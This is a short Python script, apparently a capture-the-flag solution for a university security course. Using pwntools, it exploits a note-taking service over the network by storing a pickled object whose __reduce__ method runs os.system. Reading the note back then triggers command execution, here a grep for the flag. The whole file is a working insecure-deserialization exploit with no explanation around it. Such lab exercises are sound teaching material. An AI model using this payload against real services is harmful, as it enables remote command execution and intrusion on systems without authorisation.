from pwn import *

url = "mustard.stt.rnl.tecnico.ulisboa.pt"
port = 23653

username = 'attacker'

# Read ----

connectionR = remote(url, port)

type_choice = b'0'  # Classy Note
action_choice = b'0'  # Read Note

connectionR.sendlineafter(b'Username:', username.encode())
connectionR.sendlineafter(b'Which note type do you want:', type_choice)  # Classy Note
connectionR.sendlineafter(b'0: Read note\n1: Write Note\n', action_choice)  # Read Note

# --------

class RCE:
    def __reduce__(self):
        cmd = ('grep -r "SSof{" .')
        return os.system, (cmd,)

# Write ----

connectionW = remote(url, port)

free_note_name = b'free_note'
free_note_content = pickle.dumps(RCE())

connectionW.sendlineafter(b'Username:', username.encode())
connectionW.sendlineafter(b'Which note type do you want:', b'1')  # Free Note
connectionW.sendlineafter(b'0: Read note\n1: Write Note\n', b'1')  # Write Note
connectionW.sendlineafter(b'note_name:', free_note_name)  # Note name
connectionW.sendlineafter(b'note_content:', free_note_content)  # Note content
connectionW.sendline(b'2 \n') # Register note

# --------

connectionR.sendlineafter(b'note_name:', free_note_name)  # Note name

print(connectionR.recvall())

